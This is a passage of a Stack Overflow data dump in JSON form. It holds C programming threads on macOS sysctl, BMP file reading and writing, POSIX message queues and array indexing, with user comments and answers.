"https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1498040815, "post_id": 44663911, "comment_id": 76330938, "body": "Works well with sysctlbyname, but I have the same problem with your code..."}], "answers": [{"comments": [{"owner": {"reputation": 129, "user_id": 6849036, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/4c2c3466a4defa2c0212fa8d7dabde07?s=128&d=identicon&r=PG&f=1", "display_name": "lelephantt", "link": "https://stackoverflow.com/users/6849036/lelephantt"}, "edited": false, "score": 0, "creation_date": 1498054100, "post_id": 44673713, "comment_id": 76340959, "body": "When I look at sysctl.h I see that both are present. Why is HW_MACHINE_ARCH even there if I can&#39;t access it?"}, {"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "reply_to_user": {"reputation": 129, "user_id": 6849036, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/4c2c3466a4defa2c0212fa8d7dabde07?s=128&d=identicon&r=PG&f=1", "display_name": "lelephantt", "link": "https://stackoverflow.com/users/6849036/lelephantt"}, "edited": false, "score": 0, "creation_date": 1498055507, "post_id": 44673713, "comment_id": 76342159, "body": "There is some other strange things, for example hw.machine is not part of the output with my sysctl command but in sysctl function call. In fact I found it by using sysctlbyname which gave me the right mib parameters. The fact that the symbols is present doesn&#39;t means that the call will give you an answer for it... If you want more info on arch then other symbols are there in mach/machine.h"}], "tags": [], "owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "is_accepted": false, "score": 0, "last_activity_date": 1498041339, "creation_date": 1498041339, "answer_id": 44673713, "question_id": 44663911, "link": "https://stackoverflow.com/questions/44663911/macos-using-sysctl-to-get-hw-machine-arch-getting-no-such-file-or-directory/44673713#44673713", "title": "MacOS using sysctl() to get HW_MACHINE_ARCH getting &quot;no such file or directory&quot;", "body": "<p>This is because you need to use <code>HW_MACHINE</code> and not <code>HW_MACHINE_ARCH</code></p>\n"}], "owner": {"reputation": 129, "user_id": 6849036, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/4c2c3466a4defa2c0212fa8d7dabde07?s=128&d=identicon&r=PG&f=1", "display_name": "lelephantt", "link": "https://stackoverflow.com/users/6849036/lelephantt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 576, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1498041339, "creation_date": 1497997183, "question_id": 44663911, "link": "https://stackoverflow.com/questions/44663911/macos-using-sysctl-to-get-hw-machine-arch-getting-no-such-file-or-directory", "title": "MacOS using sysctl() to get HW_MACHINE_ARCH getting &quot;no such file or directory&quot;", "body": "<p>I've been using sysctl for a lot of things recently and now I the HW_MACHINE_ARCH variable. I am using the following code. Note that when I try to get the other variable HW_MACHINE this code works perfectly. I have also thought that maybe the HW_MACHINE_ARCH is a level deeper and put it as a third mib argument but then i got the error \"Is a directory\". Any ideas as to why this isn't working??</p>\n\n<p>Code:</p>\n\n<pre><code>  #import&lt;sys/sysctl.h&gt;\n\n  char *OSArch = (char *)calloc(32, 1);\n  mib[0] = CTL_HW;\n  mib[1] = HW_MACHINE_ARCH;\n  if (sysctl(mib, 2, OSArch, &amp;size_32, NULL, 0) == -1){\n    fprintf(stderr, \"[!] OSArch failed. errno: [%d][%s]\\n\", errno, \n    strerror( errno));\n  } else {\n    fprintf(stdout, \"OSArch: %s\\n\", OSArch);\n    //fprintf(tdout, \"buffer int: %d\\n\", int_buffer);\n  }\n  free(OSArch);\n</code></pre>\n"}, {"tags": ["c", "image-processing"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1497995845, "post_id": 44663662, "comment_id": 76312933, "body": "Use a debugger and find out why."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1497995937, "post_id": 44663662, "comment_id": 76312961, "body": "You should use the bitmap headers defined in windows. h.  <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd183375(v=vs.85).aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/windows/desktop/&hellip;</a>"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1497996022, "post_id": 44663662, "comment_id": 76312985, "body": "@Micha&#235;lRoy The headers used (<code>unistd.h</code>) suggest that the code is for *nix."}, {"owner": {"reputation": 169, "user_id": 2814864, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c81afb2cd12b7dc59e061a0af24e8281?s=128&d=identicon&r=PG&f=1", "display_name": "Isaac Kennedy", "link": "https://stackoverflow.com/users/2814864/isaac-kennedy"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1497996049, "post_id": 44663662, "comment_id": 76312991, "body": "@EugeneSh. yup, I&#39;m on a Mac"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1497996051, "post_id": 44663662, "comment_id": 76312993, "body": "@Micha&#235;lRoy what if your target OS isn&#39;t windows?"}, {"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1497996051, "post_id": 44663662, "comment_id": 76312994, "body": "You correctly allocate <code>sizeof(char) * infoHeader-&gt;imageSize</code> memory, but then read <code>sizeof(char)</code> bytes into it. What exactly do you expect that to do for you? What exactly do you think <code>printf(&quot;%s&quot;, data);</code> is going to print?"}, {"owner": {"reputation": 169, "user_id": 2814864, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c81afb2cd12b7dc59e061a0af24e8281?s=128&d=identicon&r=PG&f=1", "display_name": "Isaac Kennedy", "link": "https://stackoverflow.com/users/2814864/isaac-kennedy"}, "reply_to_user": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1497996120, "post_id": 44663662, "comment_id": 76313009, "body": "@KenWhite I coded the printf to test if I was reading the data correctly."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1497996255, "post_id": 44663662, "comment_id": 76313057, "body": "It is not text. It might have a string terminator, but not where you expect."}, {"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 1, "creation_date": 1497996554, "post_id": 44663662, "comment_id": 76313165, "body": "You output something as a string (null-terminated) that isn&#39;t a null terminated string. That call to printf shows you nothing except random garbage up to the first null."}, {"owner": {"reputation": 169, "user_id": 2814864, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c81afb2cd12b7dc59e061a0af24e8281?s=128&d=identicon&r=PG&f=1", "display_name": "Isaac Kennedy", "link": "https://stackoverflow.com/users/2814864/isaac-kennedy"}, "reply_to_user": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1497996603, "post_id": 44663662, "comment_id": 76313185, "body": "@KenWhite isn&#39;t the second argument of fread the size of each element to be read? This is what I expect, to get the data of the image and store it in a char array."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1497998950, "post_id": 44663662, "comment_id": 76313905, "body": "@felixpalmen  what if the code needs to be ported later ?  member names are important."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1497999408, "post_id": 44663662, "comment_id": 76314045, "body": "@Micha&#235;lRoy the code is in general non-portable as soon as a &quot;packed struct&quot; is used. Member names on the other hand don&#39;t matter at all. But using <code>windows.h</code> makes it even <i>less</i> portable."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498009048, "post_id": 44663662, "comment_id": 76316301, "body": "The struct is packed <i>because</i> the bitmap header is a file header. It&#39;s specified explicitly, as it should be, to would ensure compatibility. That&#39;s a first step towards portability.  What if the user would like to reuse his code at a later date?  Should he rewrite his library in 5, or 10 years?  Is it a dumb move to leave the door open to reuse published, open source code in his library today?"}], "answers": [{"tags": [], "owner": {"reputation": 64759, "user_id": 277304, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/4c90624b2aa9623d5ba30db0e34b2000?s=128&d=identicon&r=PG", "display_name": "leonbloy", "link": "https://stackoverflow.com/users/277304/leonbloy"}, "is_accepted": false, "score": 0, "last_activity_date": 1497997546, "last_edit_date": 1497997546, "creation_date": 1497997228, "answer_id": 44663918, "question_id": 44663662, "link": "https://stackoverflow.com/questions/44663662/trouble-reading-writing-bmp-file-in-c/44663918#44663918", "title": "Trouble reading/writing .bmp file in C", "body": "<p>Probably the problem is with the <code>fseek</code>, for which you don't check the return value.</p>\n\n<pre><code>  fwrite(header, sizeof(char), sizeof(BMP_Info_Header), fp);\n  fseek(fp, sizeof(char) * header-&gt;fileHeader.offset, SEEK_SET);\n  fwrite(data, sizeof(char), header-&gt;imageSize, fp);\n</code></pre>\n\n<p>See, if your current position after writing the header is less than the <code>fileHeader.offset,</code> , what do you expect to happen? Fill the remaining bytes with random values ? with zero? In any case, you should explicitly write those bytes.</p>\n"}, {"tags": [], "owner": {"reputation": 169, "user_id": 2814864, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c81afb2cd12b7dc59e061a0af24e8281?s=128&d=identicon&r=PG&f=1", "display_name": "Isaac Kennedy", "link": "https://stackoverflow.com/users/2814864/isaac-kennedy"}, "is_accepted": false, "score": 1, "last_activity_date": 1498095820, "creation_date": 1498095820, "answer_id": 44688776, "question_id": 44663662, "link": "https://stackoverflow.com/questions/44663662/trouble-reading-writing-bmp-file-in-c/44688776#44688776", "title": "Trouble reading/writing .bmp file in C", "body": "<p>So, I did found the solution to my problem. Trouble is, when a BMP file is NOT compressed, the value in the <code>imageSize</code> variable found in the <code>BMP_Info_Header</code> struct is equal to 0, so when I called the <code>fread</code> and <code>fwrite</code> functions, they wouldn't read or write anything because the <code>header-&gt;imageSize</code> value was 0. The solution I found was to substitute the <code>header-&gt;imageSize</code> calls for <code>3 * header-&gt;width * header-&gt;height</code>, that way I can get the real image resolution and I multiply it by 3 so I can get the exact pixel values. By the way, thanks for the help guys! Appreciate it!</p>\n"}], "owner": {"reputation": 169, "user_id": 2814864, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c81afb2cd12b7dc59e061a0af24e8281?s=128&d=identicon&r=PG&f=1", "display_name": "Isaac Kennedy", "link": "https://stackoverflow.com/users/2814864/isaac-kennedy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 872, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1498095820, "creation_date": 1497995768, "last_edit_date": 1497996756, "question_id": 44663662, "link": "https://stackoverflow.com/questions/44663662/trouble-reading-writing-bmp-file-in-c", "title": "Trouble reading/writing .bmp file in C", "body": "<p>My program needs to be able to read a .bmp image, write some data in it and then create another .bmp image. For a start, I began coding some stuff to read an image and the rewrite the same image in another file, but I got some problems in it.\nHere's my code: </p>\n\n<p>bmp.h:</p>\n\n<pre><code>#ifndef _BMP_H_\n#define _BMP_H_\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\n#pragma pack(push, 1)\ntypedef struct {\n  uint16_t type;\n  uint32_t fileSize;\n  uint16_t reserved1;\n  uint16_t reserved2;\n  uint32_t offset;\n} BMP_File_Header;\n\ntypedef struct {\n  BMP_File_Header fileHeader;\n  uint32_t bSize;\n  int32_t width;\n  int32_t height;\n  uint16_t planes;\n  uint16_t bitCount;\n  uint32_t compression;\n  uint32_t imageSize;\n  int32_t xPixelsPerMeter;\n  int32_t yPixelsPerMeter;\n  uint32_t colorUsed;\n  uint32_t importantColor;\n} BMP_Info_Header;\n#pragma pack(pop)\n\nBMP_Info_Header* loadBMP(const char *filename, char *data);\nvoid writeBMP(BMP_Info_Header *infoHeader, char *data);\n\n#endif\n</code></pre>\n\n<p>bmp.c:</p>\n\n<pre><code>#include \"bmp.h\"\n\n\nBMP_Info_Header* loadBMP(const char *file_name, char *data) {\n  FILE *file;\n  BMP_Info_Header *infoHeader;\n  int n;\n\n  //Open the file\n  file = fopen(file_name, \"rb\");\n  if (!file) {\n    fprintf(stderr, \"Failed to read file %s.\\n\", file_name);\n    exit(1);\n  }\n\n  //Alloc and read the headers\n  infoHeader = (BMP_Info_Header *) malloc (sizeof(BMP_Info_Header));\n\n  n = fread(infoHeader, sizeof(BMP_Info_Header), 1, file);\n\n  //Check format\n  if (infoHeader-&gt;fileHeader.type != 0x4D42) {\n    fclose(file);\n    fprintf(stderr, \"Invalid image\");\n    exit(1);\n  }\n\n  //-------------------------Checking the image--------------------------\n  if (infoHeader-&gt;bSize != 40) {\n    fclose(file);\n    fprintf(stderr, \"Couldn't load image correctly\");\n    exit(1);\n  }\n\n  if ((infoHeader-&gt;planes != 1) || (infoHeader-&gt;bitCount != 24)) {\n    fclose(file);\n    fprintf(stderr, \"Invalid image\");\n    exit(1);\n  }\n\n  if (infoHeader-&gt;compression != 0) {\n    fclose(file);\n    fprintf(stderr, \"This software currently does not support compressed BMP files.\\n\");\n    exit(1);\n  }\n\n  //Move the file through the offset until the beginning of the data itself\n  fseek(file, sizeof(char) * infoHeader-&gt;fileHeader.offset, SEEK_SET);\n\n  //Allocate the char array to the needed size to hold the data\n  data = (char *) malloc (sizeof(char) * infoHeader-&gt;imageSize);\n\n  //Actually read the image data\n  fread(data, sizeof(char), infoHeader-&gt;imageSize, file);\n  printf(\"%s\", data);\n\n  //Verify the data\n  if (!data) {\n    fclose(file);\n    fprintf(stderr, \"Couldn't load image data correctly\\n\");\n    exit(1);\n  }\n\n  fclose(file);\n  return infoHeader;\n\n}\n\nvoid writeBMP(BMP_Info_Header *header, char *data){\n\n  FILE *fp;\n  fp = fopen(\"output.bmp\", \"wb\");\n  int n;\n\n  if (!fp) {\n    fclose(fp);\n    fprintf(stderr, \"Unable to create output file\\n\");\n    exit(1);\n  }\n\n  //-----------------------WRITE THE IMAGE------------------------\n  //Header\n  n = fwrite(header, sizeof(char), sizeof(BMP_Info_Header), fp);\n  if (n &lt; 1) {\n    fclose(fp);\n    fprintf(stderr, \"Couldn't write the image header.\\n\");\n    exit(1);\n  }\n\n  //Offset\n  fseek(fp, sizeof(char) * header-&gt;fileHeader.offset, SEEK_SET);\n\n  //Data\n  n = fwrite(data, sizeof(char), header-&gt;imageSize, fp);\n  if (n &lt; 1) {\n    fclose(fp);\n    fprintf(stderr, \"Couldn't write the image data.\\n\");\n    exit(1);\n  }\n\n  fclose(fp);\n  fprintf(stdout, \"Image written successfully!\\n\");\n}\n</code></pre>\n\n<p>It seems to always fall off at the \"Couldn't write the image data\" error.  Can somebody help me? I'm fairly new to programming and couldn't fix it by myself.</p>\n"}, {"tags": ["c", "posix", "message-queue"], "comments": [{"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1497999910, "post_id": 44663645, "comment_id": 76314183, "body": "Please indicate the code line which gives you that error, and copy paste the error message so we can see it too."}, {"owner": {"reputation": 1863, "user_id": 847717, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/3431f3fcbb22d05a08100acfc4520131?s=128&d=identicon&r=PG", "display_name": "haris", "link": "https://stackoverflow.com/users/847717/haris"}, "reply_to_user": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1498028023, "post_id": 44663645, "comment_id": 76322235, "body": "the error line is higlited"}], "answers": [{"comments": [{"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1498028611, "post_id": 44665901, "comment_id": 76322567, "body": "Note that you then really should pass in an array that have 1024 elements, right now <code>msg</code> is just a single char."}, {"owner": {"reputation": 66, "user_id": 7744232, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34328c2246fd41a20b9407f825fc8e6e?s=128&d=identicon&r=PG&f=1", "display_name": "slzy", "link": "https://stackoverflow.com/users/7744232/slzy"}, "reply_to_user": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1498033675, "post_id": 44665901, "comment_id": 76325754, "body": "Sorry, the <code>mq_msgsize</code> is 10,  the value is best set to 10."}], "tags": [], "owner": {"reputation": 66, "user_id": 7744232, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34328c2246fd41a20b9407f825fc8e6e?s=128&d=identicon&r=PG&f=1", "display_name": "slzy", "link": "https://stackoverflow.com/users/7744232/slzy"}, "is_accepted": false, "score": 1, "last_activity_date": 1498012137, "creation_date": 1498012137, "answer_id": 44665901, "question_id": 44663645, "link": "https://stackoverflow.com/questions/44663645/mq-receive-throws-error-saying-mesage-too-long/44665901#44665901", "title": "mq_receive throws error saying mesage too long", "body": "<p>I have just checked the man page of mq_receive, and one of the error is shown as follow:</p>\n\n<pre><code>EMSGSIZE\n          msg_len was less than the mq_msgsize attribute of the message queue.\n</code></pre>\n\n<p>and I change the </p>\n\n<pre><code>retVal = mq_receive (*pMQDes,&amp;msg,sizeof(char),&amp;msg_priority);\n</code></pre>\n\n<p>to </p>\n\n<pre><code>retVal = mq_receive (*pMQDes,&amp;msg,1024 * sizeof(char),&amp;msg_priority);\n</code></pre>\n\n<p>where the 1024 is the mq_msgsize you set. Then the error disappear.</p>\n"}], "owner": {"reputation": 1863, "user_id": 847717, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/3431f3fcbb22d05a08100acfc4520131?s=128&d=identicon&r=PG", "display_name": "haris", "link": "https://stackoverflow.com/users/847717/haris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 328, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1498028002, "creation_date": 1497995714, "last_edit_date": 1498028002, "question_id": 44663645, "link": "https://stackoverflow.com/questions/44663645/mq-receive-throws-error-saying-mesage-too-long", "title": "mq_receive throws error saying mesage too long", "body": "<p>I am new to linux programming trying to acheive a simple msg queue working .\nBut get the error saying message to long , below is my code please suggest if any corrections.</p>\n\n<p>i know similar question is asked many times but i couldnt find solution to my probelm hence posting the code.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;fcntl.h&gt;           \n#include &lt;sys/stat.h&gt;        \n#include &lt;mqueue.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;errno.h&gt;\n\nvoid* producerThRoutine (void *arg);\nvoid* ConsumerThRoutine (void *arg);\n\nint main()\n{\n  int retVal = 0;\n  pthread_t producerThId,consumerThID;\n  mqd_t myMQdes;\n  struct mq_attr attr;  \n\n  attr.mq_flags = 0;  \n  attr.mq_maxmsg = 1024;  \n  attr.mq_msgsize = 10;  \n  attr.mq_curmsgs = 0; \n\n  myMQdes = mq_open(\"/myMessageQueue\",O_CREAT | O_RDWR,S_IWUSR | S_IRUSR,&amp;attr);\n  if(myMQdes == (mqd_t) -1){\n    perror(\"Message Queue creation failed\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  retVal = pthread_create(&amp;producerThId,NULL,producerThRoutine,&amp;myMQdes);\n  if(retVal != 0){\n    perror(\"\\n producerThRoutine creation failed \\n\");\n    exit(EXIT_FAILURE); \n  }\n\n  retVal = pthread_create(&amp;consumerThID,NULL,ConsumerThRoutine,&amp;myMQdes);\n  if(retVal != 0){\n    perror(\"\\n ConsumerThRoutine creation failed \\n\");\n    exit(EXIT_FAILURE); \n  }\n\n  retVal = pthread_join(producerThId,NULL);\n  if(retVal != 0){\n    perror(\"\\n pthread_join for producer thread failed \\n\");\n    exit(EXIT_FAILURE); \n  }\n\n  retVal = pthread_join(consumerThID,NULL);\n  if(retVal != 0){\n    perror(\"\\n pthread_join for consumer thread failed \\n\");\n    exit(EXIT_FAILURE); \n  }\n  mq_close(myMQdes);\n  mq_unlink(\"/myMessageQueue\");\n  return 0; \n}\n\n\nvoid* producerThRoutine (void *arg)\n{\n  char c;   \n  char EOS = '\\0';\n  int retVal;\n  mqd_t *pMQDes = (mqd_t *) arg;\n  printf(\"Enter the string you want to convert to upper case \\n\");\n\n  while( (c=getchar()) != EOF ){\n    if(c == '\\n'){\n        retVal = mq_send( (*pMQDes),&amp;EOS,sizeof(char),1);\n        if(retVal != 0){\n            perror(\"sending EOS to queue failed \\n\");\n            exit(EXIT_FAILURE);         \n        }\n        break;\n    }       \n    retVal = mq_send( (*pMQDes),&amp;EOS,sizeof(char),1);\n    if(retVal != 0){\n        perror(\"sending character to queue failed \\n\");\n        break ;         \n    }\n  }\n}\n\n void* ConsumerThRoutine (void *arg)\n {\n   char msg;\n   int msg_priority,retVal;\n\n   mqd_t *pMQDes = (mqd_t *) arg;\n\n   while(1){\n    printf(\"\\nthe converted string is : \");\n</code></pre>\n\n<blockquote>\n  <p>retVal = mq_receive (*pMQDes,&amp;msg,sizeof(char),&amp;msg_priority);</p>\n</blockquote>\n\n<pre><code>    if(retVal == -1){\n        perror(\"mq_receive failed\");    \n        exit(EXIT_FAILURE); \n    }\n    if( msg == '\\0')\n    {\n        break;\n    }\n    putchar(toupper(msg));\n  }\n }\n</code></pre>\n"}, {"tags": ["c", "arrays", "pointers", "segmentation-fault"], "comments": [{"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 3, "creation_date": 1497995376, "post_id": 44663547, "comment_id": 76312760, "body": "<code>color1[3]</code> is out of range."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1497995495, "post_id": 44663547, "comment_id": 76312801, "body": "Array indexes start at 0, not 1, in almost all programming languages."}, {"owner": {"reputation": 2024, "user_id": 1315171, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/081b87a82980b9c47ce10d65653ffe57?s=128&d=identicon&r=PG", "display_name": "Zakir", "link": "https://stackoverflow.com/users/1315171/zakir"}, "edited": false, "score": 1, "creation_date": 1497995642, "post_id": 44663547, "comment_id": 76312864, "body": "Invest some time to learn to use Macros instead of ugly digits when playing around with Arrays"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1497995760, "post_id": 44663547, "comment_id": 76312903, "body": "Also there is a nicer syntax for <code>*(red + i)</code> - namely, <code>red[i]</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497998471, "post_id": 44663547, "comment_id": 76313770, "body": "Rolled back. You must not change your question once you have answers if those loose context from the edit. This is no interactive debugging site!"}, {"owner": {"reputation": 39, "user_id": 4959689, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-JGNZiHrmdt4/AAAAAAAAAAI/AAAAAAAAACY/HZ71NpRdHBU/photo.jpg?sz=128", "display_name": "calvinjarrod", "link": "https://stackoverflow.com/users/4959689/calvinjarrod"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497999221, "post_id": 44663547, "comment_id": 76313988, "body": "@olaf How do you show updated code then?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497999458, "post_id": 44663547, "comment_id": 76314064, "body": "@calvinjarrod: Read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>! You also should have taken the <a href=\"https://stackoverflow.com/tour\">tour</a> during registration. After two years you should know how SO works."}, {"owner": {"reputation": 27492, "user_id": 3773011, 